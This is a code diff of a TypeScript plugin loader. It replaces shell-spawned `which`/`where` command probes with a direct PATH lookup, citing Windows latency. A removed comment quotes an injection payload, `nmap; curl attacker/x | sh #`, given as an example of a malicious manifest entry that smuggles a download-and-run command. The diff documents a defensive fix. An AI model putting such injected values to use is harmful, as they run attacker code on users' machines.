@@ -1,8 +1,8 @@
-import { execSync, spawn, spawnSync } from 'child_process'
 import { existsSync, readFileSync, writeFileSync, mkdirSync, copyFileSync } from 'fs'
 import { dirname, join } from 'path'
 import { homedir } from 'os'
 import { bundledRoot } from './plugins/loader'
+import { isOnPath } from './command-lookup'
 import { isDisabled } from './plugins/state'
 
 export interface PluginManifest {
@@ -251,54 +251,25 @@ function shellRcFor(plugin: PluginManifest): string {
   return process.env.SHELL?.includes('zsh') ? '.zshrc' : '.bashrc'
 }
 
-// Per-command lookup cache.  `where.exe` on Windows costs 70-300ms per call
-// (PATH walk + PATHEXT expansion), and the answer virtually never changes
-// during a session.  Cache indefinitely; `invalidateCommandCache()` resets
-// after an install/uninstall so the next `detectHooks()` re-probes.
+// Per-command lookup cache. The answer virtually never changes during a
+// session; `invalidateCommandCache()` resets it after an install/uninstall so
+// the next `detectHooks()` re-probes.
 const _cmdCache = new Map<string, boolean>()
 export function invalidateCommandCache(): void { _cmdCache.clear() }
 
+// A PATH lookup, not a spawned `which` / `where`: one process per probe cost
+// hundreds of milliseconds on Windows, on the main thread (command-lookup.ts).
+// The name comes from a manifest's `requires[]` and is never interpreted.
 function commandExists(cmd: string): boolean {
   const hit = _cmdCache.get(cmd)
   if (hit !== undefined) return hit
-  // v0.6.93 P0-B: was `execSync(`which ${cmd}`)` — the plugin manifest's
-  // `requires[]` string flows into a shell, so a malicious manifest like
-  // `requires: ["nmap; curl attacker/x | sh #"]` executes arbitrary shell.
-  // spawnSync with explicit argv keeps the string as one process argument
-  // and never touches a shell.
-  try {
-    const probeCmd = process.platform === 'win32' ? 'where' : 'which'
-    const result = spawnSync(probeCmd, [cmd], { stdio: 'ignore' })
-    const found = result.status === 0
-    _cmdCache.set(cmd, found)
-    return found
-  } catch {
-    _cmdCache.set(cmd, false)
-    return false
-  }
+  const found = isOnPath(cmd)
+  _cmdCache.set(cmd, found)
+  return found
 }
 
 function commandExistsAsync(cmd: string): Promise<boolean> {
-  const hit = _cmdCache.get(cmd)
-  if (hit !== undefined) return Promise.resolve(hit)
-  return new Promise((resolve) => {
-    try {
-      const probeCmd = process.platform === 'win32' ? 'where' : 'which'
-      const child = spawn(probeCmd, [cmd], { stdio: 'ignore' })
-      child.on('close', (code) => {
-        const found = code === 0
-        _cmdCache.set(cmd, found)
-        resolve(found)
-      })
-      child.on('error', () => {
-        _cmdCache.set(cmd, false)
-        resolve(false)
-      })
-    } catch {
-      _cmdCache.set(cmd, false)
-      resolve(false)
-    }
-  })
+  return Promise.resolve(commandExists(cmd))
 }
 
 function isClaudeSettingsInstalled(matcher: string): boolean {
